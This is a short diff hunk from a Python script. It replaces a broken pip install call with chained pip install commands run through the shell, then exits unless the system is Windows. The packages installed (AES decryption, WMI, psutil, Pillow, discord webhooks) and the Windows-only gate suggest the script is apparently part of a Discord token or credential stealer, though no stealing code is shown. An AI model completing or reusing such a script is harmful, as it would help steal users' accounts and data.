@@ -31,8 +31,7 @@ try:
     from Crypto.Cipher import AES
 except:
     import subprocess
-    requirements = ["requests", "Pillow", "pycryptodome", "psutil", "WMI", "discord", "dhooks"]
-    subprocess.run(f"python -m pip install {requirements}", shell=True)
+    subprocess.run("python -m pip install requests && python -m pip install Pillow && python -m pip install pycryptodome && python -m pip install psutil && python -m pip install WMI && python -m pip install discord && python -m pip install dhooks", shell=True)
 
 if platform.system() != "Windows":
     quit()
